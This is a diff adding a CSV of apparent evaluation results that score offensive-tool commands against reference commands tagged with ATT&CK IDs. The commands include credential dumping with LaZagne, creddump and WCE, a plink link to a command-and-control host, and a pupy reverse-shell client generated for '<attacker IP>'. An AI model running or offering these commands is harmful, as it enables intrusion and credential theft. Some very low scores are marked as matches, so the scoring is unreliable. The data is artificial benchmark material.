@@ -1,0 +1,21 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -no-antispoof <attacker_ssh_user>@<command_and_control_server_IP>,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.411,True
+command_pupy_TA0001_T1078.txt,pupy,lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.105,True
+command_pupy_TA0003_T1078.txt,pupy,lazagne -c <credentials_file>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.233,True
+command_pupy_TA0003_T1078.txt,pupy,creddump -s <system_hash>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.172,True
+command_pupy_TA0003_T1078.txt,pupy,hashmon -m <process_memory_path>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.236,True
+command_pupy_TA0003_T1078.txt,pupy,loot_memory -b <browser_password>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.216,True
+command_pupy_TA0004_T1078.txt,pupy,lazagne --all,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.135,True
+command_pupy_TA0005_T1078.txt,pupy,creddump,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",0.104,True
+command_pupy_TA0005_T1078.txt,pupy,Lazagne,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.082,True
+command_pupy_TA0005_T1078.txt,pupy,loot_memory -b <browser_name>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.299,True
+command_pupy_TA0005_T1078.txt,pupy,cred,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,0.084,True
+command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce -n MYDOMAIN -u NETWORK SERVICE -p WORKGROUP,"```sh
+wce.exe -w
+```",0.149,True
+command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce -k MYDOMAIN -t <TGT_ticket> -s <Session_Key>,"```sh
+wce.exe -w
+```",0.147,True
+command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce -d MYDOMAIN -u NETWORK SERVICE -p WORKGROUP,"```sh
+wce.exe -w
+```",0.149,True
